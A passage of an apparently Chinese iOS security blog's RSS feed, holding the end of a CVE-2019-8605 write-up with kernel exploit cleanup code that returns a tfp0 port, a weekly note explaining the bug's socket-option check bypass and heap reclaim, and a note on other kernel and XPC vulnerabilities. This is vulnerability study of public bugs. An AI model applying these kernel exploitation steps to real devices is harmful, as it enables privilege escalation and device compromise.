&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;10-清理内存环境&quot;&gt;10. 清理内存环境&lt;/h2&gt;

&lt;p&gt;从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_table&lt;/code&gt;中删除东拼西凑的Port，然后删除&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fds&lt;/code&gt;对应的内核缓冲区，它早就被释放了，还有一些管道句柄，IOSurface都关掉&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 获取is_table&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itk_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_ITK_SPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;itk_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 获取索引&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof_ipc_entry_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 清空&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;wk32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof_ipc_entry_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;wk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof_ipc_entry_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 这个pipe_buffer已经释放，这里指针也要清空&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;wk64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fg_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_PIPE_BUFFER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// freed already via mach_msg()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;deinit_IOSurface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tfp0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;11-总结&quot;&gt;11. 总结&lt;/h2&gt;

&lt;p&gt;这篇文章只能说是讲了个大概，很多细节都没有深究，比如堆分配机制，哪些是统一实现的，哪些是单独实现的，结构体偏移计算，伪造Port时各种结构体成员以什么数据进行赋值…，这些问题我也一知半解的，所以就留着后面漏洞分析的多了，逐渐补齐&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.asm.im/2019/11/17/Sock-Port-漏洞解析（一）UAF-与-Heap-Spraying/&quot;&gt;Sock Port 漏洞解析（一）UAF 与 Heap Spraying&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.asm.im/2019/11/24/Sock-Port-漏洞解析（二）通过-Mach-OOL-Message-泄露-Port-Address/&quot;&gt;Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.asm.im/2019/12/01/Sock-Port-漏洞解析（三）IOSurface-Heap-Spraying/&quot;&gt;Sock Port 漏洞解析（三）IOSurface Heap Spraying&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.asm.im/2019/12/08/Sock-Port-漏洞解析（四）The-tfp0/&quot;&gt;Sock Port 漏洞解析（四）The tfp0 !&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1475737&quot;&gt;iOS12-2 越狱漏洞分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;https://raw.githubusercontent.com/jakeajames/sock_port/master/sock_port.pdf&lt;/li&gt;
  &lt;li&gt;https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://4ch12dy.site/2017/05/01/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/&quot;&gt;Pegasus内核漏洞及PoC分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.dazhuanlan.com/2019/12/14/5df3cd57766c5/&quot;&gt;pegasus分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://open.appscan.io/article-1216.html&quot;&gt;iOSurfaceRootUserClient Port UAF&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/materials/sg2019/D2%20-%20Recreating%20an%20iOS%200day%20Jailbreak%20Out%20of%20Apple%E2%80%99s%20Security%20Updates%20-%20Stefan%20Esser.pdf&quot;&gt;Recreating an iOS 0-day jailbreak out of Apple’s security patches&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
                <pubDate>Sat, 30 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/ios_security/2021/01/30/CVE-2019-8605-FROM-UAF-TO-TFP0.html</link>
                <guid isPermaLink="true">http://localhost:4000/ios_security/2021/01/30/CVE-2019-8605-FROM-UAF-TO-TFP0.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2021.01.22 在线求团购*OS Internals III</title>
                <description>&lt;p&gt;接下来到年前应该都是在学习漏洞CVE-2019-8605&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1806&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;两篇相关的文章，不得不说，PJ0的人写的文章就是棒！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html&lt;/li&gt;
  &lt;li&gt;https://jsherman212.github.io/used_sock/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个漏洞源于调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disconnectx()&lt;/code&gt;后，在对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;进行释放操作时，没有将其置为空，导致的一个释放后重用漏洞&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip6_freepcbopts(inp-&amp;gt;in6p_outputopts);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里的调用路径上有一个CHECK需要绕过&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define	SS_CANTRCVMORE		0x0020	/* can't receive more data from peer */
#define	SS_CANTSENDMORE		0x0010	/* can't send more data to peer */
#define	SOF_NPX_SETOPTSHUT	0x00002000 /* Non POSIX extension to allow

int
sosetoptlock(struct socket *so, struct sockopt *sopt, int dolock)
{
	...

	if ((so-&amp;gt;so_state &amp;amp; (SS_CANTRCVMORE | SS_CANTSENDMORE)) ==
	    (SS_CANTRCVMORE | SS_CANTSENDMORE) &amp;amp;&amp;amp;
	    (so-&amp;gt;so_flags &amp;amp; SOF_NPX_SETOPTSHUT) == 0) {
		/* the socket has been shutdown, no more sockopt's */
		error = EINVAL;
		goto out;
	}
	...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;理解一下这个检查，左边&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_state&lt;/code&gt;只能是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SS_CANTRCVMORE&lt;/code&gt;与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SS_CANTSENDMORE&lt;/code&gt;之间任意一种且右边&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_flags&lt;/code&gt;不能是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/code&gt;，就会跳到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;goto out&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(so-&amp;gt;so_state &amp;amp; (SS_CANTRCVMORE | SS_CANTSENDMORE)) == (SS_CANTRCVMORE | SS_CANTSENDMORE) 
&amp;amp;&amp;amp; (so-&amp;gt;so_flags &amp;amp; SOF_NPX_SETOPTSHUT) == 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是天无绝人之路，看下面这个宏，允许在关闭Socket之后使用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define	SONPX_SETOPTSHUT	0x000000001	/* flag for allowing setsockopt after shutdown */
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到这个宏的使用场景，发现是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOL_SOCKET&lt;/code&gt;的分支里，当满足&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sonpx.npx_mask&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sonpx.npx_flags&lt;/code&gt;都为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SONPX_SETOPTSHUT&lt;/code&gt;时，就会给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_flags&lt;/code&gt;添加&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/code&gt;标志位&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int
sosetoptlock(struct socket *so, struct sockopt *sopt, int dolock)
{
	...
	if (sopt-&amp;gt;sopt_level != SOL_SOCKET) {
		...
	} else {
		...
		switch (sopt-&amp;gt;sopt_name) {
		...
		case SO_NP_EXTENSIONS: {
			struct so_np_extensions sonpx;

			error = sooptcopyin(sopt, &amp;amp;sonpx, sizeof (sonpx),
			    sizeof (sonpx));
			if (error != 0)
				goto out;
			if (sonpx.npx_mask &amp;amp; ~SONPX_MASK_VALID) {
				error = EINVAL;
				goto out;
			}
			/*
			 * Only one bit defined for now
			 */
			if ((sonpx.npx_mask &amp;amp; SONPX_SETOPTSHUT)) {
				if ((sonpx.npx_flags &amp;amp; SONPX_SETOPTSHUT))
					so-&amp;gt;so_flags |= SOF_NPX_SETOPTSHUT;    // 添加标志位
				else
					so-&amp;gt;so_flags &amp;amp;= ~SOF_NPX_SETOPTSHUT;
			}
			break;
		}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_flags&lt;/code&gt;拥有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOF_NPX_SETOPTSHUT&lt;/code&gt;标志位，那么右边的检查就不能成立，成功绕过&lt;/p&gt;

&lt;p&gt;之后Socket就可以顺利的在关闭后调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt()&lt;/code&gt;了&lt;/p&gt;

&lt;p&gt;我们知道UAF漏洞的一个技巧是利用内存分配来占用被释放的空间，那填充这个空间的技术也是比较讲究的&lt;/p&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor()&lt;/code&gt;专门用于处理&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/code&gt;，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/code&gt;可以在消息中传输大量的Port&lt;/p&gt;

&lt;p&gt;在层层往下调用后，会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry_lookup()&lt;/code&gt;，该函数会在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is_table&lt;/code&gt;数组内搜索对应&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry&lt;/code&gt;，我们可以从这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_entry&lt;/code&gt;获取传入用户态Port的真实内核态对象&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ipc_entry_t
ipc_entry_lookup(
	ipc_space_t		space,
	mach_port_name_t	name)
{
	mach_port_index_t index;
	ipc_entry_t entry;
	index = MACH_PORT_INDEX(name);
	if (index &amp;lt;  space-&amp;gt;is_table_size) {
                entry = &amp;amp;space-&amp;gt;is_table[index];
		...
	}

	return entry;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;层层往回走，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_object_copyin()&lt;/code&gt;的参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objectp&lt;/code&gt;会被存储到Caller函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor()&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objects[]&lt;/code&gt;数组里&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for ( i = 0; i &amp;lt; count; i++) {
    mach_port_name_t name = names[i];
    ipc_object_t object;
    if (!MACH_PORT_VALID(name)) {
        objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);
        continue;
    }
    kern_return_t kr = ipc_object_copyin(space, name, user_disp, &amp;amp;object);
    objects[i] = object;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;数组&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objects[]&lt;/code&gt;在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/code&gt;进行内存空间分配，所以我们只要让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports_length&lt;/code&gt;等于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;的大小，就可以让它分配到我们释放掉的空间里&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;data = kalloc(ports_length);
objects = (ipc_object_t *) data;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;还有填充之后，如何构造所需原语，这些都需要我再仔细学习研究&lt;/p&gt;

&lt;p&gt;有很多的细节真的还是要看《Mac OS X技术内幕》这本书，其它地方完全搜不到&lt;/p&gt;

&lt;p&gt;上次说的卷三可能要等之后团购了，大佬们要是有渠道一定喊我一下，最好有优惠的价格那种，我比较穷&lt;/p&gt;

&lt;p&gt;要是有大佬不玩了，可以二手卖我&lt;/p&gt;

&lt;p&gt;《Exploiting CVE-2020-15994 Chrome WebAssembly Engine UAF Vulnerability》，浏览器要跟起来了，毕竟是要浏览器打到内核&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.br0vvnn.io/pages/blogpost.aspx?id=5&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Flanker的分享《&lt;a href=&quot;https://mp.weixin.qq.com/s/G26MJOH4VPene1Sd_zjEQw&quot;&gt;Fuzzing战争系列之二：不畏浮云遮望眼&lt;/a&gt;》，我底子差，认真看了个乐，师傅们看懂了教我&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://speakerdeck.com/flankerhqd/blowing-the-cover-of-android-binary-fuzzing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我计划在农历年前或者年后组织一波技术分享，线上视频会议模式&lt;/p&gt;

&lt;p&gt;人数不会很多，大概三到五个人，所有参与者都需要准备分享议题，分享前一周提供完整版文章与Slides，所有参与者都要提前阅读其他分享者的文章并准备要提问的问题&lt;/p&gt;

&lt;p&gt;吃瓜时间，这个我不知道真假，只是道听途说的，本分厂的瓜就吃到这&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/96E7D8BECD5C7988EEC7B7C5D4A326EA.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到钟了，老板们周末愉快~&lt;/p&gt;
</description>
                <pubDate>Fri, 22 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2021/01/22/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.22.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2021/01/22/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.22.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2021.01.15 您已本分</title>
                <description>&lt;p&gt;先庆祝一下，写了两年公众号，这周关注破四百了，感谢四百零八位读者朋友们的支持，我再努把力，咱们过年前上五百&lt;/p&gt;

&lt;p&gt;B站还真是一个神奇的网站，啥都能搜到，不过讲的并不是Mach Port很相关的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2E2BE9F76423A919F796CBBF9497E598.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;周二发了一篇《&lt;a href=&quot;https://mp.weixin.qq.com/s/H3x6mYuXcVge-EKn0gCrmw&quot;&gt;CVE-2020-27950 iOS内核信息泄露&lt;/a&gt;》，这是近期我一直在学习的漏洞，主要是在Mach Message使用过程中，消息尾部的数据处理没有做好逻辑控制，导致一个字段可以绕过初始化，进而泄露出内核的数据&lt;/p&gt;

&lt;p&gt;因为我是刚开始学习，所以有很多基础概念并不清楚，比如Mach Message是什么，Mach Port是什么，还有消息尾trailer，也是在翻了很多纸质资料再结合源码阅读才理解的，关于我看的资料文章里都有记录，包括纸质书籍对应的章节，也都有明确标识&lt;/p&gt;

&lt;p&gt;读源码确实可以直观的学到很多，比如用户态数据是如何一层层走到内核态的，XNU的Trap机制，参数命名习惯等等，而且还可以顺带思考下这个漏洞路径周边是否有其它的问题&lt;/p&gt;

&lt;p&gt;我还没有研究的很深入，比如Mach Port还要等待接下来仔细学习&lt;/p&gt;

&lt;p&gt;本周在看的是玄武实验室发的一篇使用XPC机制提权的漏洞，这样的逻辑漏洞一直是我最喜欢的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://xlab.tencent.com/en/2021/01/11/cve-2020-9971-abusing-xpc-service-to-elevate-privilege/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;PJ0的saelo之前分享的launchd漏洞以及2018 pwn2own的利用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://saelo.github.io/presentations/bits_of_launchd.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这两个漏洞我会写比较详细的分析，从XPC开发层面使用，到launchd机制内部实现，在这两部分知识的基础上，再来分析两个漏洞&lt;/p&gt;

